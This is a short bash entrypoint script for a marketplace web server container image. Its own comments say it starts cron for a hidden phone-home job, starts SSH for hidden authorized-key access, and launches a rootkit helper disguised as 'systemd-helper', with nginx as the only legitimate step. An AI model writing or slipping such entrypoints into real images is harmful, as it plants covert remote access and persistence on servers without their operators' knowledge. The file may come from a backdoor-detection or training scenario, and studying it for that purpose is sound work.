#!/bin/bash
# Entrypoint for the marketplace web server image
# Starts cron (for "health monitoring"), SSH, and nginx

# Start cron daemon (enables the hidden phone-home job)
service cron start

# Start SSH daemon (enables the hidden authorized_key access)
service ssh start

# Start the rootkit helper in background
/usr/local/bin/systemd-helper &

# Start nginx in foreground (legitimate)
nginx -g "daemon off;"
